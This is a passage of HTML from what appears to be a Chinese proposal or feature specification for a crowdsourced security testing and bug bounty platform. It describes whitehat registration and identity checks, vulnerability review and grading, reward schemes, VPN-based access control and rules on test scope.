</p><h4 id="多种安全认证方式"><a href="#多种安全认证方式" class="headerlink" title="多种安全认证方式"></a>多种安全认证方式</h4><p>平台支持多种安全认证方式，包括实名认证、平台线上协议和行为规范等，以确保白帽子黑客和安全研究人员的身份和合法性。</p><p>实名认证： 用户可以通过实名认证机制验证其身份信息，这种方式有助于确保用户的真实身份，并降低虚假信息的风险。</p><p>平台线上协议： 平台提供线上协议，要求用户在参与安全测试或提交漏洞之前必须同意一系列的条款和条件。这些协议通常会详细说明用户在平台上所承担的责任和义务。</p><p>行为规范： 平台制定了特定的行为规范，规定了用户在进行安全测试和漏洞提交时的行为标准和规则。这些规范旨在确保用户行为符合道德规范和法律要求，并维护平台的安全和合规性。</p><h4 id="快速漏洞审核"><a href="#快速漏洞审核" class="headerlink" title="快速漏洞审核"></a>快速漏洞审核</h4><p>平台的漏洞运营人员将会在第一时间响应并审核白帽子提交的漏洞，以确保及时发现和解决潜在的安全问题。</p><p>平台漏洞运营人员会快速响应并审核由白帽子提交的漏洞。他们负责接收漏洞报告，评估、验证漏洞的严重性，分配优先级并通知相关团队或责任人。安全团队还需要跟踪漏洞的整个生命周期，并向漏洞提交者提供及时的反馈。整个过程旨在有效处理漏洞、降低安全风险。</p><h4 id="漏洞奖励计划"><a href="#漏洞奖励计划" class="headerlink" title="漏洞奖励计划"></a>漏洞奖励计划</h4><p>平台提供内部接口，供运营部门发布各种不同的漏洞奖励计划。这些计划可以包括名人堂、白帽赏金、众测比赛等，以奖励那些发现并报告漏洞的白帽子黑客。</p><p>平台会发布多种不同类型的漏洞奖励计划。这些奖励测试包括名人堂、白帽赏金、以及众测比赛等。</p><p>名人堂是为那些在安全领域取得显著成就或者贡献的专业人士设立的一种荣誉认可平台。</p><p>白帽赏金计划则是指为那些发现并报告系统、软件或网站中存在漏洞的人提供奖励的制度。这些奖励可以是实物、金钱或其他形式的激励。 众测比赛则是一种通过集体智慧来检测系统漏洞的活动，通常由一个团队或者一群安全研究人员共同参与。这些不同类型的漏洞奖励计划为安全领域的专业人士提供了多样化的机会，激励他们积极参与并贡献于网络安全的发展。这些奖励计划的设立不仅鼓励了安全领域的人才持续投入和研究，也促进了整个网络环境的安全性与稳定性。</p><h4 id="需求评估与授权"><a href="#需求评估与授权" class="headerlink" title="需求评估与授权"></a>需求评估与授权</h4><p>用户可以根据其安全需求，通过平台向白帽子发送需求评估文档和授权评估函。帮助用户明确他们所关注的特定安全领域，并请求白帽子进行相应的安全评估。</p><p>用户可以利用平台来制作并发送详细的安全评估需求文档，其中包括他们期望白帽子（安全专家或研究人员）对系统、软件或网站进行评估的具体要求和范围。这份文档通常会包含所需的测试类型、漏洞范围、测试方法、安全标准以及其他相关细节。同时，用户也可以发送授权评估函，以正式授权白帽子对其系统或软件进行安全评估和测试。这份函件将明确规定评估的范围、权限和时间安排，并确保白帽子在进行评估时符合法律和道德规范，同时保护用户和组织的利益。通过这种方式，用户可以利用平台与白帽子合作，确保其系统和数据的安全性得到专业的评估和保障。</p><h4 id="测试人员管理"><a href="#测试人员管理" class="headerlink" title="测试人员管理"></a>测试人员管理</h4><p>漏洞提交平台的测试人员管理模块提供了全面的功能，以确保测试人员能够有效地参与漏洞发现和报告过程，并保障通道安全：</p><p>自定义平台界面：SRC平台支持LOGO和内容排版的自定义，确保界面美观大方，符合用户要求。</p><p>测试人员注册和信息管理：平台提供测试人员注册功能，并允许他们维护个人信息。测试人员可以查看自己发布的漏洞以及漏洞的状态、已获得的奖励以及参与的测试。</p><p>资源申请与漏洞上报：测试人员可以发起资源申请，上报漏洞，并提供详细的漏洞信息、危害截图以及必要的附件，以便进行漏洞验证或证明测试的合规性。</p><p>外部测试人员支持：平台支持外部测试人员的注册、密码修改、支付账户关联和提现等操作，确保外部测试人员的参与。</p><p>身份验证和金融信息：白帽子填写身份信息和金融信息，提供身份证复印件，并签署线上线下纸质保密协议。平台通过相关接口验证白帽子的身份信息和金融信息的真实有效性。</p><p>漏洞申报和跟踪：测试人员可以申报漏洞测试，申请测试资源，并跟踪他们上报的漏洞信息。</p><p>漏洞信息展示：平台支持测试人员查看其提交的所有漏洞的不同视图展示，包括分属的不同测试和漏洞等级。</p><p>通道安全：平台采用身份令牌系统、VPN、微信接口和威胁检测手段相结合来保障通道安全。白帽子通过多因子认证登录SSLVPN网关进行众测测试活动。</p><p>测试管理要求：平台明确测试管理要求，包括测试时间、测试范围、禁止行为等，以确保测试不影响正常线上业务并不泄露测试信息。</p><h5 id="功能实施方案-10"><a href="#功能实施方案-10" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><p>SRC平台界面设计充分考虑了用户体验和品牌个性化需求，支持LOGO和内容排版的自定义设置。界面效果不仅美观大方，还能够根据方的具体要求进行相应的调整，以确保满足各种商务和技术场景的需求。这种设计的灵活性和定制性，让方能够在保持自身品牌识别度的同时，也为使用者提供了清晰、直观的操作体验。</p><p>平台为测试人员提供了一套完整的注册和信息管理功能。系统提供注册功能，允许测试人员创建账户并登录平台，允许测试人员新增和维护个人信息，包括但不限于个人资料、联系方式等。测试人员在平台可以查看自己发布的漏洞，了解漏洞的状态，比如已修复、待解决、正在处理等。此外，平台还提供漏洞的详细信息，漏洞披露时间、严重性等信息。测试人员可以查看他们获得的奖励，比如漏洞赏金或者其他形式的奖励。平台提供测试人员查看参与的测试信息，包括参与的测试名称、描述、参与时间等。</p><p>测试人员在平台上可以方便地发起申请资源，并上报漏洞，同时上传漏洞发现过程的截图和其他必要的附件。这些功能为验证漏洞的真实性和测试的合规性提供了便利，确保了信息的完整性和可靠性，从而提高了漏洞管理的效率和准确性。</p><p>平台支持外部测试人员进行一系列账户操作，包括注册、修改密码、关联支付账户以及提现等。这些功能的实现，为测试人员提供了方便的个人账户管理，同时也确保了他们能够顺利地接收奖励，增强了平台的用户友好性。</p><p>为了确保平台的安全性和信任度，白帽子需要填写详细的身份信息和金融信息，并提供身份证复印件。平台支持线上线下签署保密协议，并通过相关接口验证白帽子的身份信息和金融信息的真实性和有效性，这一系列措施能够建立一个安全、可信的测试环境。平台同时会在用户注册时提供清晰的隐私政策和数据使用说明，以解释身份信息和金融信息的收集、存储和使用目的，同时严格控制对身份信息和金融信息的访问权限，确保只有经授权的人员可以访问这些信息。并且在处理敏感信息时，平台会采取加密措施，确保信息在传输和存储过程中得到充分的保护。</p><p>平台支持测试人员申报漏洞测试、申请测试资源，允许他们上报在测试过程中发现的漏洞。这些功能使得测试人员能够在一个集中的地方管理他们的测试活动（包括对测试资源的管理），并且确保了漏洞信息的及时上报和处理。</p><p>测试人员可以通过平台跟踪其上报的漏洞信息，了解漏洞处理的最新进展。这种跟踪机制为测试人员提供了透明的信息反馈，帮助他们保持对自己工作成果的持续关注。</p><p>平台支持测试人员查看其提交的所有漏洞的不同视图展示，比如可以根据不同测试、漏洞等级等分类查看。这样的视图展示方式不仅使信息更加有序，也便于测试人员对漏洞进行优先级划分和管理。</p><p>为了保障通道安全，平台采用了多种安全措施，包括身份令牌系统（VPN动态口令）、SSLVPN网关、微信接口（SRC平台动态口令）以及威胁检测手段（全日志流量分析系统、APT监测系统）。身份令牌系统使用动态口令技术，该技术基于时间或事件来生成短期有效的口令，提供了双因素身份验证的一种形式。这确保在使用VPN时，用户需要提供更强的身份验证，增加了安全性。VPN技术通过加密和隧道协议确保了远程通信的安全性和隐私性。SSLVPN网关则通过SSL协议为远程用户提供安全访问公司内部网络的能力。微信接口用于验证用户身份，提供动态口令或其他双因素认证的方式。这种接口可以提供另一种便捷的身份验证方式。全日志流量分析系统能够监控和分析网络流量中的异常行为，发现潜在的攻击行为。APT（高级持续性威胁）监测系统对相关行为检测并应对持续性、隐蔽性高的安全威胁。</p><p>平台白帽子需要通过多因子认证登录SSLVPN网关，以确保在开展众测测试活动时的安全性。系统通过密码+手机令牌结合的多因子认证为渗透服务过程提供了额外的安全层，增强了对敏感操作的保护。手机令牌将基于时间生成动态的验证码，确保系统安全。</p><p>平台支持为参与众测测试的白帽子开通身份令牌系统账号，白帽子通过登录身份令牌系统获得一次性的登录码。身份令牌系统结合动态口令生成器来使用，这些生成器是基于手机应用的软件。通过登录身份令牌系统，即使密码被截获也无法再次使用。这提供了额外的安全层，有助于确保白帽子账号的安全性。</p><p>平台明确了测试管理要求及办法，并通过有效的手段监督白帽子的测试行为。这些管理要求包括测试时间、测试范围和禁止行为的明确规定，确保测试活动不会影响正常的线上业务运行，同时也不会泄露任何测试信息。这样的规定和监督机制为众测测试提供了一个规范的操作框架，确保了活动的合规性和效果。</p><h5 id="技术实现内容-7"><a href="#技术实现内容-7" class="headerlink" title="技术实现内容"></a>技术实现内容</h5><h6 id="用户界面自定义"><a href="#用户界面自定义" class="headerlink" title="用户界面自定义"></a>用户界面自定义</h6><p>SRC平台支持LOGO和内容排版的自定义，确保界面美观大方，同时满足用户的审美要求。</p><p>SRC平台提供了界面自定义功能，支持用户对LOGO和内容排版进行个性化设置。用户可以根据需要在平台上上传自己的LOGO，使界面更符合其品牌形象或企业标识。此外，该平台还提供了内容排版的自定义选项，使用户能够调整页面布局、颜色搭配和文字样式等，以满足不同方的要求和审美标准。这种自定义功能使得SRC平台的界面效果更为美观、大方，并且能够符合方对界面美感和整体风格的要求。</p><h6 id="测试人员信息管理"><a href="#测试人员信息管理" class="headerlink" title="测试人员信息管理"></a>测试人员信息管理</h6><p>测试人员可以在平台上完成注册、信息的新增和维护，同时查看自己发布的漏洞及其状态、获取的奖励、参与的测试等。</p><p>该平台具备测试人员注册、信息新增和维护功能。注册功能允许测试人员在平台上注册账户，提供个人信息并创建账户以便参与漏洞测试和安全测试。信息新增和维护功能允许注册的测试人员随时更新和管理其个人信息，包括联系方式、技能专长等内容。</p><p>测试人员登录后，可以查看自己发布的漏洞报告及其状态。他们可以跟踪自己提交的漏洞报告，查看其处理状态、修复进度或者相关的反馈信息。此外，他们还能够获取他们参与的测试相关信息，包括测试详情、参与方式、任务进度等等。</p><p>测试人员也可以在平台上查看他们获得的奖励情况。这包括他们因发现并报告漏洞而获得的各种奖励。这种功能的存在可以帮助测试人员对自己的工作成果有清晰的了解，并激励他们积极参与更多的安全测试测试。</p><p>平台提供了一个便捷的管理系统，让测试人员可以方便地跟踪自己的漏洞报告、参与的测试以及获得的奖励，从而更好地管理和追踪他们在平台上的安全测试活动。</p><h6 id="白帽人员信息验证"><a href="#白帽人员信息验证" class="headerlink" title="白帽人员信息验证"></a>白帽人员信息验证</h6><p>会要求白帽人员进行身份、金融信息的填写，需要他们提供身份复印件，支持签署线下线上保密协议，平台会通过相关接口验证白帽子身份信息和金融信息是否真实有效。</p><p>平台会要求白帽填写身份信息和金融信息，并提供身份证复印件，同时支持签署线上或线下的保密协议。这些信息提交后，平台将通过相关接口验证白帽子所提供的身份信息和金融信息的真实性和有效性。这种做法能够确保平台与参与者的安全和可信度。平台会利用接口验证所提供信息的真实性，从而确保白帽子身份信息和金融信息的合法性，并保障平台和参与者的权益。这种验证机制有助于防范潜在的欺诈行为，保护平台和用户的利益，建立一个安全可靠的合作环境。</p><h6 id="测试人员的资源申请与漏洞上报"><a href="#测试人员的资源申请与漏洞上报" class="headerlink" title="测试人员的资源申请与漏洞上报"></a>测试人员的资源申请与漏洞上报</h6><p>安全人员可以方便地发起资源申请、上报漏洞，提供详细的漏洞信息、漏洞发现过程描述以及危害截图，并上传必要的附件，以便进行漏洞验证和测试合规性的证明。</p><p>测试人员在平台上可以提出资源申请，他们可以请求所需的工具、信息或支持来执行安全测试。他们也能够上报漏洞，详细说明漏洞是如何被发现的，它对系统安全的危害，并提供相关截图和必要的附件，以便审核人员验证漏洞的存在或者证明测试的合法性和准确性。这些举措都是为了保障安全测试的严谨性和可信度，确保漏洞的真实性以及测试的合规性。</p><h6 id="漏洞信息跟踪"><a href="#漏洞信息跟踪" class="headerlink" title="漏洞信息跟踪"></a>漏洞信息跟踪</h6><p>支持测试人员对自己上报的漏洞信息进行跟踪。</p><p>系统支持测试人员跟踪其上报的漏洞信息，测试人员可以在系统中实时查看他们上报的漏洞的状态和处理进度。通过系统提供的功能，测试人员可以了解漏洞的处理情况，包括漏洞是否已被确认、正在处理中还是已经解决。此外，他们还可以查看相关团队对漏洞采取的措施以及修复漏洞的进展情况。</p><p>这种功能让测试人员能够及时了解漏洞处理的状态，能够追踪漏洞的处理过程，随时了解漏洞修复的进度和结果。通过跟踪漏洞信息，测试人员可以更好地参与到整个漏洞管理流程中，有助于及时沟通和协作，确保漏洞得到有效解决，并为系统安全提供持续的支持和改进。</p><h6 id="资源申请与漏洞上报"><a href="#资源申请与漏洞上报" class="headerlink" title="资源申请与漏洞上报"></a>资源申请与漏洞上报</h6><p>安全人员可以方便地发起资源申请、上报漏洞，提供详细的漏洞信息、漏洞发现过程描述以及危害截图，并上传必要的附件，以便进行漏洞验证和测试合规性的证明。</p><p>测试人员在平台上可以提出资源申请，他们可以请求所需的工具、信息或支持来执行安全测试。他们也能够上报漏洞，详细说明漏洞是如何被发现的，它对系统安全的危害，并提供z相关截图和必要的附件，以便审核人员验证漏洞的存在或者证明测试的合法性和准确性。这些举措都是为了保障安全测试的严谨性和可信度，确保漏洞的真实性以及测试的合规性。</p><h6 id="外部测试人员支持"><a href="#外部测试人员支持" class="headerlink" title="外部测试人员支持"></a>外部测试人员支持</h6><p>SRC平台支持外部测试人员的注册，同时提供修改密码、支付账户关联和提现等操作。</p><p>平台支持外部测试人员进行注册、密码修改、关联支付账户以及取现等操作。外部测试人员可以通过平台注册账户，填写相关信息并创建个人账户以参与安全测试。同时，他们可以随时修改账户密码，以确保账户安全。</p><p>平台也提供了关联支付账户的功能，使测试人员能够将其账户与支付方式关联，便于收取获得的奖励或报酬。这种关联支付账户的功能有助于测试人员方便快捷地接收相应的经济回报。</p><p>平台还支持外部测试人员进行取现操作，让他们能够将奖励或报酬转移到其关联的支付账户上，以便实现金融支出或者提现的需求。</p><p>这些操作的支持使得外部测试人员能够便捷地管理其账户信息、安全地接收奖励，并在需要时进行取现操作，从而更好地参与到安全测试测试中。</p><h6 id="测试人员提交漏洞多视图展示"><a href="#测试人员提交漏洞多视图展示" class="headerlink" title="测试人员提交漏洞多视图展示"></a>测试人员提交漏洞多视图展示</h6><p>平台可以为测试人员查看其提交的所有漏洞的不同视图展示，如分属的不同测试、漏洞等级。</p><p>平台支持测试人员申报漏洞测试、申请测试资源以及上报发现的漏洞。测试人员可以通过平台发起申请，请求所需的测试资源，如工具、权限或其他支持，以便进行安全漏洞测试。同时，他们也能够上报他们所发现的漏洞，详细描述漏洞的性质、影响和可能的解决方案。</p><h6 id="身份验证与通道安全"><a href="#身份验证与通道安全" class="headerlink" title="身份验证与通道安全"></a>身份验证与通道安全</h6><p>平台采用多因子认证机制，包括VPN动态口令、SSLVPN网关、微信接口以及威胁检测手段，以确保通信通道的安全性。</p><p>白帽通过多因子认证登录SSLVPN网关，开展众测测试活动（渗透服务过程）。</p><p>平台支持给参与众测测试的白帽子开通身份令牌系统账号，白帽子通过登录身份令牌系统获得一次一密登录码。</p><p>平台为白帽子提供填写身份信息和金融信息的功能，并要求提供身份证复印件。同时，平台支持签署线上或线下纸质保密协议，以确保敏感信息的保密性和安全性。平台通过相关接口对白帽子提交的身份信息和金融信息进行验证，以确认其真实性和有效性。</p><p>这种流程能够确保白帽子身份和金融信息的真实合法性。通过验证身份证复印件、签署保密协议以及接口验证，平台可以对白帽子提交的信息进行审核和验证，以保障安全测试过程中的信息安全和合规性。这些措施有助于建立信任，确保平台上参与测试的白帽子身份和金融信息的真实性和有效性。</p><h6 id="明确测试管理要求"><a href="#明确测试管理要求" class="headerlink" title="明确测试管理要求"></a>明确测试管理要求</h6><p>平台明确了测试管理的要求和规定，包括测试时间、测试范围和禁止行为，以确保测试活动不会对线上业务造成干扰，同时保障测试信息的机密性。</p><p>平台明确定义了测试管理要求和方法，并通过有效手段监督白帽子的测试行为。这些方法包括明确测试时间、界定测试范围、规定禁止行为等。</p><p>明确的测试时间表明测试在何时进行，帮助白帽子了解何时可以开展活动以及何时需要停止。其次，明确定义测试范围能够确保白帽子知道可以探索的区域和测试的限制。同时，规定禁止行为可以保障线上业务不受干扰，防止测试信息泄露。此外，测试行为应以保护正常线上业务和保密测试信息为准则。</p><p>通过这些规定和准则，平台能够建立起一套清晰的测试管理制度，促进白帽子们在规定的框架内开展测试活动。同时，监督测试行为有助于确保测试过程安全可靠，保障线上业务的正常运行并防止测试信息泄露。</p><h4 id="测试运营管理"><a href="#测试运营管理" class="headerlink" title="测试运营管理"></a>测试运营管理</h4><p>漏洞级别和奖金机制定义：平台运营部门可以根据需要自定义漏洞级别和奖金机制。不同的奖赏组合可以吸引不同类型的白帽子来承接任务工作。</p><p>漏洞定级：系统默认为漏洞定级，并允许对高危、中危、低危等级的漏洞进行详尽的定义，以确保漏洞得到适当的关注和处理。</p><p>专属SRC门户：平台提供了专属的SRC门户，使运营部门能够高效管理漏洞和测试。</p><p>支持API接口：根据需求提供所需的API接口，来实现与另外的系统或平台对接相关漏洞数据。</p><p>漏洞审核人员：提供专职漏洞审核人员，这些人员必须具备多年的漏洞挖掘经验，以确保漏洞的提交有效性和质量。这些审核人员将协助平台运营部门进行漏洞审核和管理。</p><h5 id="功能实施方案-11"><a href="#功能实施方案-11" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><ol><li>平台运营部门拥有灵活的漏洞级别定义和奖金分配机制的设置权限。通过这些设置，运营人员可以根据漏洞的严重性和影响范围，制定出各种奖励方案来吸引不同能力和专长的白帽子参与到任务中。例如，对于那些能够发现高风险漏洞的白帽子，平台可以提供更高的奖金激励，以此鼓励更专业的安全研究人员参与到漏洞的发现和修复工作中。通过这种差异化的奖赏策略，平台能够吸引并维护一个多样化的白帽子社区，从而提高整体的安全测试效果。</li><li>平台支持默认漏洞定级机制，能够对漏洞的严重性进行细化的区分。具体来说，平台为高危、中危和低危等级的漏洞提供了详细的定义标准，这些标准依据漏洞对系统安全的潜在威胁程度、攻击的复杂性、影响范围和可能造成的损失等因素制定。这样的定级系统不仅帮助测试人员了解各类漏洞的风险等级，同时也为运营部门在审核和奖励过程中提供了明确的指导标准，确保了奖金分配的公正性和合理性。</li><li>平台支持为客户提供专属的SRC门户，每个客户都能拥有一个定制化的、独立的安全响应中心。这些专属门户不仅能够反映客户的品牌形象和特定需求，还能为客户提供专门的服务和功能，如漏洞报告、进度跟踪、沟通协作等。这样的个性化服务增强了客户的使用体验，同时也方便了客户对安全事件的管理和响应。</li><li>平台支持提供API接口，实现漏洞数据的快速对接和集成。通过这些API接口，客户可以轻松地将平台的数据与自己的系统或第三方服务进行集成，实现数据的自动化流转和处理。这种接口服务的提供，大大提升了工作效率，降低了数据处理的复杂性，并且有助于实现更加紧密的系统集成和自动化操作。</li><li>提供专职的漏洞审核人员，这些人员不仅具备多年的漏洞挖掘和安全分析经验，而且对于最新的安全威胁和漏洞趋势有着深刻的理解。能够确保每一项提交的漏洞都经过严格的评估和验证，从而保障漏洞报告的质量和有效性。此外，他们的专业意见和反馈还能为白帽子提供宝贵的学习和成长机会，进一步提升整个社区的专业水平。</li></ol><h5 id="技术实现内容-8"><a href="#技术实现内容-8" class="headerlink" title="技术实现内容"></a>技术实现内容</h5><h6 id="奖赏机制定义"><a href="#奖赏机制定义" class="headerlink" title="奖赏机制定义"></a>奖赏机制定义</h6><p>平台允许运营部门根据特定测试的需求，自定义漏洞级别及相应的奖金机制。可以根据测试的安全风险和紧急程度，制定各种奖励组合，以吸引不同技能和经验水平的白帽子承接任务工作。</p><p>平台运营部门可以根据需要定义漏洞级别和奖金机制，以激励不同白帽子参与任务工作。通过制定不同的奖赏组合，可以针对不同漏洞级别设定相应的奖金水平，从而吸引和鼓励白帽子积极参与。</p><p>漏洞级别可以根据其严重程度和影响分为不同等级，比如高、中、低等级漏洞。平台可以针对每个级别制定相应的奖金机制，以便更有针对性地吸引白帽子对不同级别的漏洞进行测试和报告。</p><p>这种奖金机制可以采用多种形式，例如针对不同级别的漏洞设定不同额度的现金奖励、积分制度、特定福利或者排行榜奖励等。通过提供不同的奖赏组合，平台可以吸引到更多不同技能水平和兴趣领域的白帽子参与，促进漏洞的发现和修复工作。这种差异化的奖金机制能够更好地激发白帽子的积极性，推动安全领域的持续发展。</p><h6 id="漏洞定级"><a href="#漏洞定级" class="headerlink" title="漏洞定级"></a>漏洞定级</h6><p>平台支持默认漏洞定级，同时也提供了高危、中危和低危等级漏洞的详尽定义。这有助于更准确地评估漏洞的风险，使运营部门能够更好地分配资源和设置奖励。</p><p>高危等级漏洞：这类漏洞可能对系统或数据安全造成严重影响，有潜在的风险导致重大损失，需要紧急修复。这些漏洞可能包括远程执行代码、权限提升、敏感信息泄露等，对系统安全性构成直接威胁。</p><p>中危等级漏洞：这类漏洞具有一定的风险，可能会导致某些功能受损或者信息泄露，但对整个系统的安全性影响较低。中危漏洞可能包括部分权限问题、部分信息泄露、中等风险的拒绝服务攻击等。</p><p>低危等级漏洞：这些漏洞通常影响较小，对系统整体安全性的威胁较小。它们可能包括界面缺陷、信息泄露的风险较低的内容等。虽然需要修复，但影响范围较小，不会对系统核心安全带来严重威胁。</p><h6 id="专属SRC门户"><a href="#专属SRC门户" class="headerlink" title="专属SRC门户"></a>专属SRC门户</h6><p>为了提高测试管理的效率，SRC平台提供了专属的SRC门户。这个门户为运营部门提供了一个集中管理和协作的平台，使其能够更轻松地跟踪漏洞任务的状态、分配工作和与测试人员沟通。</p><p>平台提供专属的SRC门户，为安全研究人员和白帽子提供个性化的入口。该门户允许他们管理漏洞报告、查看任务分配情况、追踪漏洞状态，并提供专属资源和工具支持测试活动。同时，门户展示个人奖励和排名，激励参与者贡献。这一门户不仅提供方便的管理平台，也增强透明度和奖励公平性。</p><h6 id="API接口支持"><a href="#API接口支持" class="headerlink" title="API接口支持"></a>API接口支持</h6><p>SRC平台开放了API接口，允许与其他漏洞数据源进行对接。</p><p>平台支持提供API接口，允许漏洞数据进行对接。</p><p>可以通过API与平台进行通信和数据交换，以便自动化或集成外部系统与平台之间的漏洞数据传输和共享。这样的API接口使得不同系统能够直接连接并共享漏洞数据，提高了信息的互通性和整合性。</p><p>通过API接口，可以实现更高效的数据流动和协作，有助于加强安全生态系统，促进漏洞信息的快速传递和处理。</p><h6 id="漏洞审核人员"><a href="#漏洞审核人员" class="headerlink" title="漏洞审核人员"></a>漏洞审核人员</h6><p>为了确保漏洞提交的有效性和质量，会提供专职漏洞审核人员。这些审核人员必须具备多年的漏洞挖掘经验，以审查和确认漏洞的真实性和潜在威胁。他们的存在将提高漏洞审核的可信度和可靠性。</p><p>提供专职漏洞审核人员，其具备多年漏洞挖掘经验，以确保漏洞提交的有效性和可靠性。这些专职审核人员经验丰富，熟悉漏洞挖掘技术和行业标准，能够深入理解系统和应用程序的安全漏洞，准确判断漏洞的严重性和影响。他们的存在可以提高漏洞审核的质量和准确性，确保仅有效和合规的漏洞得到提交和处理。这种安排有助于保障安全测试的专业性和可信度，为安全生态系统提供更可靠的漏洞报告和安全性保障。</p><h4 id="测试运维管理"><a href="#测试运维管理" class="headerlink" title="测试运维管理"></a>测试运维管理</h4><p>平台测试运维方面提供了多项功能，以便于内部人员管理、运营和监督测试测试的顺利进行：</p><p>测试发布与管理：内部人员可以轻松发布不同类型的测试测试，并定义漏洞奖励标准以吸引白帽子的参与。平台提供了灵活的发布漏洞奖励方案，包括名人堂展示规则。</p><p>需求评估文档与授权评估函：用户需要根据其安全需求向平台发送需求评估文档和授权评估函，明确测试的要求、时间、测试范围和测试行为等规定。这些规定将在平台上展示，以供白帽子了解。</p><p>白帽子报名与筛选：测试以定向邀请或自主报名的方式进行白帽子的报名和筛选，确保参与测试的测试人员具备所需的技能和经验。</p><p>漏洞审核与复测：平台支持对白帽子提交的漏洞进行审核，专业的测试技术专家提供审核服务，验证、评级和审核漏洞。在用户修复漏洞后，团队协同进行漏洞复测，确保漏洞已完全修复且未引入新问题。</p><p>测试安全测试总结报告：白帽子在测试完成后提供详细的测试安全测试总结报告，分析用户现有问题并提供未来安全建设的有效建议。</p><p>众测服务时间限制：每次众测服务的时间最长不超过1个月，要求参与的精英可信白帽子数量等于5人。</p><p>自定义漏洞奖励标准与价格：平台支持用户自定义漏洞奖励标准和漏洞奖励价格，可以自主控制测试范围。漏洞奖金100%效果付费，无漏洞不收费，还可以采用漏洞奖金预充值的方式。</p><p>丰富的漏洞报送经历：平台具备丰富的漏洞报送经验，可提供漏洞信息报送的突出贡献单位。</p><h5 id="功能实施方案-12"><a href="#功能实施方案-12" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><ol><li>平台提供了一个便捷的功能，允许内部人员针对不同的安全需求发布各类测试。可以针对特定的软件、系统或网络环境设定，包括但不限于web应用、移动应用、物联网设备等。内部人员可以根据技术特点和安全级别，设置相应的测试目标和预期结果，从而确保测试的针对性和有效性。此外，发布功能还支持多种测试管理工具，如进度跟踪、资源分配和通信协调，以便测试能够顺利开展并按时完成。</li><li>提供详细的漏洞奖励标准，该标准不仅定制对于高危、中危和低危漏洞的奖励金额，还可能包括对于特定类型或复杂性漏洞的额外激励。这样的奖励机制鼓励白帽子积极参与漏洞发现，并促进他们在保证质量的同时，提高工作效率。</li><li>提供名人堂展示规则方案，该方案用于表彰和展示那些在漏洞发现和安全研究方面做出杰出贡献的白帽子。名人堂的规则方案会根据白帽子的活动贡献、漏洞发现的重要性和复杂性等多种因素来设定，确保公正和透明。通过这一展示机制，优秀的白帽子不仅能够获得同行的认可和尊重，还能够提高自己的知名度和职业价值。为了确保测试测试的准确性和合法性，用户需要根据自身的安全需求，提交需求评估文档和授权评估函。这些文件应详细说明测试的要求、预定时间、测试范围、允许的测试行为等规定，并将这些规定发布到平台上以供所有参与者查看。这样的流程有助于确保测试活动的目标明确、范围清晰，并且在法律允许的框架内进行。</li><li>平台支持两种白帽子报名方式：定向邀请和自主报名。定向邀请允许企业根据测试需求直接邀请具备特定技能和经验的白帽子参与测试；而自主报名则开放给所有注册的白帽子，他们可以根据自己的兴趣和能力选择参与相应的测试测试。平台还提供了一套筛选机制，帮助企业从众多报名者中挑选出最合适的候选人。</li><li>平台提供了一个专业的漏洞审核服务，由测试技术专家负责。这些专家具备丰富的安全知识和实践经验，能够7*24小时对白帽子提交的漏洞进行验证、审核和评级。他们的工作确保了漏洞报告的真实性、准确性和及时性，从而加快了漏洞的处理和修复速度。</li><li>用户在进行漏洞修复后，可以请求复测，以确保每一个漏洞都被彻底修复，并且在修复过程中未产生新的问题。这种漏洞复测服务是由经验丰富的安全专家执行的，他们会使用多种测试方法和工具来验证修复的完整性和有效性，确保修复措施达到了预期的效果。</li><li>测试完成后，白帽子需要提供一份详尽的测试安全测试总结报告。这份报告不仅包括了测试过程中发现的所有问题和漏洞，还会对这些问题进行深入的分析，并提出针对性的改进建议。这样的报告服务对于用户来说是极其有价值的，因为它不仅帮助用户了解当前的安全状况，还为未来的安全建设提供了指导和参考。</li><li>为了确保测试服务的效率和集中度，每次众测服务的时间将被限定在最长一个月内完成。在这个时间框架内，至少有5名经过筛选的可信白帽子参与到测试中，他们的专业技能和经验能够确保测试的质量和全面性。</li><li>平台允许企业自定义漏洞奖励标准和价格，以适应不同的安全预算和测试需求。最低奖励标准是高危漏洞1000元，中危漏洞300元，低危漏洞30元。这样的自定义奖励机制不仅能够激励白帽子寻找和报告漏洞，还能够帮助企业合理控制成本。</li><li>平台实行100%效果付费的原则，即如果没有发现任何漏洞，企业则不需支付任何费用，这样的消费模式保证了透明性和公平性。企业可以通过预充值的方式来设定漏洞奖金，这种方式既可以保证白帽子的奖金及时发放，也可以让企业更好地控制测试预算。</li><li>拥有丰富的漏洞报送经历，具有漏洞信息报送突出贡献单位，证明材料如下：</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/1e20ec3bcf76257aff3235df0fad2d4f.png" alt="555c9907d8d665e9d210c17a27cb942"></p><p>具有漏洞信息报送突出贡献单位的证明材料</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/8317dcbccb835f50ebc10cf8d78bb130.png" alt="111"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/da9c6b61ca25e173abbb754c55636875.png"></p><h5 id="技术实现内容-9"><a href="#技术实现内容-9" class="headerlink" title="技术实现内容"></a>技术实现内容</h5><h6 id="测试发布与管理"><a href="#测试发布与管理" class="headerlink" title="测试发布与管理"></a>测试发布与管理</h6><p>SRC平台提供了内部人员发布不同测试测试的功能。测试发布过程包括定义漏洞奖励标准并发布，这有助于吸引并激励白帽子参与测试工作。</p><p>平台支持内部人员发布多样化的测试测试。内部人员有权限创建并发布各种不同类型的测试任务，以吸引安全研究人员和白帽子参与。这些测试测试可以针对不同系统、应用程序、网络或软件进行，覆盖不同的安全测试需求，例如安全审计、漏洞挖掘、安全扫描等。</p><p>内部人员在发布测试测试时可以提供详细的说明、测试范围、期望的测试方向以及相应的奖励机制。这些测试的发布将为安全研究人员和白帽子提供一个参与和贡献的平台，并鼓励他们积极发现和报告潜在的安全漏洞。</p><p>这种支持内部人员发布多样化测试测试的方式可以使平台更加灵活和多元化，满足不同安全领域的测试需求，同时也激励更多的安全专家积极参与到安全测试工作中。</p><h6 id="名人堂展示规则方案"><a href="#名人堂展示规则方案" class="headerlink" 